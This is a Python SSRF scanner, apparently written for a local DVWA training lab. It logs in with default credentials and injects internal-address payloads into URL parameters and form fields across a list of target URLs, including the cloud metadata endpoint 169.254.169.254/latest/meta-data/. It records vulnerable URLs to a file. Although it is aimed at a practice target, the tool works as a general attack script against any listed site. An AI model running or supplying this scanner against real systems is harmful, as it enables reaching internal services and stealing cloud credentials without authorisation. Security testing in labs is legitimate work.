import requests
import threading
import time
import warnings
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore

# Configuration
base_url = "http://127.0.0.1:42001/"
vuln_url = base_url + "vulnerable-endpoint"
ssrf_url = "http://127.0.0.1:80/admin"  # Internal service we want to access

# Headers
headers = {
    'Cookie': 'PHPSESSID=rkg47evun26n2jg6vjhrg3vlk8; security=low',
}

# Function to login to DVWA
def login_dvwa(session, url, username, password):
    login_url = urljoin(url, 'login.php')
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    response = session.post(login_url, data=login_data)
    if "login" in response.url:
        print(f"{Fore.RED}[CONSOLE] Login failed. Check credentials.")
    else:
        print(f"{Fore.GREEN}[CONSOLE] Login successful.")

def get_all_forms(url):
    r = s.get(url)
    soup = BeautifulSoup(r.content, "lxml")
    return soup.find_all("form")

def get_details(form):
    details = {}
    try:
        act = form.attrs.get("action").lower()
    except:
        act = None

    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_value = tag.attrs.get("value", "")
        input_name = tag.attrs.get("name")
        inputs.append({"type": input_type, "value": input_value, "name": input_name})
    details["method"] = method
    details["action"] = act
    details["inputs"] = inputs
    return details

def is_vuln(response):
    indicators = {
        "internal",
        "localhost",
        "169.254.",
        "0.0.0.0",
        "127.0.0.1"
    }
    try:
        for indicator in indicators:
            if indicator in response.text.lower():
                return True
        return False
    except UnicodeDecodeError:
        return False
    except requests.exceptions.RequestException:
        pass

def scan_ssrf(url):
    f = open("vuln.txt", "a+")
    try:
        payloads = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254"]
        for payload in payloads:
            new_url = f"{url}?url={payload}"
            print(f"{Fore.WHITE}[CONSOLE] Trying: {new_url}")
            r = s.get(new_url)
            if is_vuln(r):
                print(f"{Fore.GREEN}[CONSOLE] Found SSRF vulnerability! " + new_url)
                f.write(new_url + "\n")
                f.close()
                return
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

    try:
        forms = get_all_forms(url)
        print(f"{Fore.CYAN}[CONSOLE] Detected {len(forms)} forms on {url}")
        for form in forms:
            form_details = get_details(form)
            
            # Test for advanced SSRF payloads
            if test_advanced_ssrf(url, form_details):
                return

            # Continue with original payloads
            for payload in payloads:
                data = {}
                for tag in form_details['inputs']:
                    if tag["type"] == "hidden" or tag["value"]:
                        try:
                            data[tag["name"]] = payload
                        except:
                            pass
                    elif tag["type"] != "submit":
                        data[tag["name"]] = f"test{payload}"
                form_url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    r = s.post(form_url, data=data)
                elif form_details["method"] == "get":
                    r = s.get(form_url, params=data)

                if is_vuln(r):
                    print(f"{Fore.GREEN}[CONSOLE] Found SSRF vulnerability in form! " + form_url)
                    f.write(form_url + "\n")
                    return
                else:
                    print(f"{Fore.WHITE}[CONSOLE] No vulnerability found for {form_url} with payload {payload}")
        f.close()
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

def test_advanced_ssrf(url, form_details):
    advanced_payloads = [
        "http://localhost:8080",
        "http://127.0.0.1:8080",
        "http://169.254.169.254/latest/meta-data/"
    ]
    for payload in advanced_payloads:
        data = {}
        for tag in form_details['inputs']:
            if tag["type"] == "hidden" or tag["value"]:
                try:
                    data[tag["name"]] = payload
                except:
                    pass
            elif tag["type"] != "submit":
                data[tag["name"]] = f"test{payload}"
        form_url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            r = s.post(form_url, data=data)
        elif form_details["method"] == "get":
            r = s.get(form_url, params=data)

        if is_vuln(r):
            print(f"{Fore.GREEN}[CONSOLE] Found advanced SSRF vulnerability in form! " + form_url)
            with open("vuln.txt", "a+") as f:
                f.write(form_url + "\n")
            return True
    return False

def start_scan():
    global checked
    try:
        threads = []
        with open('urls.txt', 'r') as f:
            R = f.readlines()
            for _ in range(thr):
                if checked < len(R):
                    for url in R:
                        time.sleep(delay)
                        t = threading.Thread(target=scan_ssrf, args=(url.strip(),))
                        t.start()
                        checked += 1
                        threads.append(t)

                    for t in threads:
                        t.join()
        f.close()
    except FileNotFoundError:
        print(f"{Fore.RED}[CONSOLE] Please create 'urls.txt' and add the URLs to it.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

def start_ssrf_scan():
    global thr, delay, checked, s
    warnings.filterwarnings('ignore', message='Unverified HTTPS request')

    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"

    # Disable SSL verification warnings
    s.verify = False

    # Create and initialize the vuln.txt file
    with open("vuln.txt", "w") as f:
        f.write("# vuln.txt\n\n")
        f.write("# This file will be used to log URLs that have SSRF vulnerabilities.\n")
        f.write("# The script will append new URLs to this file as it finds them.\n\n")

    # Login to DVWA
    dvwa_url = 'http://127.0.0.1:42001/'
    dvwa_username = 'admin'
    dvwa_password = 'password'
    login_dvwa(s, dvwa_url, dvwa_username, dvwa_password)

    thr = 10  # Set number of threads
    delay = 0  # Set delay between requests

    checked = 0
    start_scan()

# Start the SSRF scan process
start_ssrf_scan()
